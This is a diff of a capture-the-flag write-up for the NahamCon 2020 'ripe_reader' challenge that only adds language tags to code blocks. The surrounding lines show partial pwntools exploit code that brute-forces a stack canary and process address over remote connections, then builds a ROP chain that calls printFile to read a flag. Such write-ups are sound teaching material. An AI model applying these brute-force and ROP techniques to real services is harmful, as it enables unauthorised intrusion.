@@ -64,7 +64,7 @@ Getting past the canary is only the first step.  There are no free leaks, so the
 
 Checking to see if we're lucky:
 
-```
+```bash
 # strings ripe_reader | grep flag.txt
 ./flag.txt
 ```
@@ -112,7 +112,7 @@ Lastly the canary.  The least significant x86_64 canary byte is `0x00`.  Only 7 
 
 ### First Pass: Brute-force stack canary
 
-```
+```python
 for i in range(7):
     for j in x:
         p = remote(server,port)
@@ -142,7 +142,7 @@ Locally this takes seconds.  Remotely about 5-10 minutes.
 
 ### Second Pass: Brute-force process address LSBytes
 
-```
+```python
 bp = 8 * b'B'
 selectimg = 0xe06
 
@@ -176,7 +176,7 @@ The payload in this case will brute-force the 4th nibble by overwriting just the
 
 ### Third Pass: Brute-force entire process address
 
-```
+```python
 for i in range(4):
     for j in x:
         p = remote(server,port)
@@ -209,7 +209,7 @@ At this point, control of RIP has been obtained.
 
 ### Final Pass: ROP call `printFile` to get the flag
 
-```
+```python
 context.update(arch='amd64')
 rop = ROP([binary])
 try:
@@ -245,7 +245,7 @@ All this left is to `printFile` `flag.txt`.
 
 Output:
 
-```
+```bash
 # time ./exploit.py two.jh2i.com 50023
 [*] '/pwd/datajerk/nahamconctf2020/ripe_reader/ripe_reader'
     Arch:     amd64-64-little
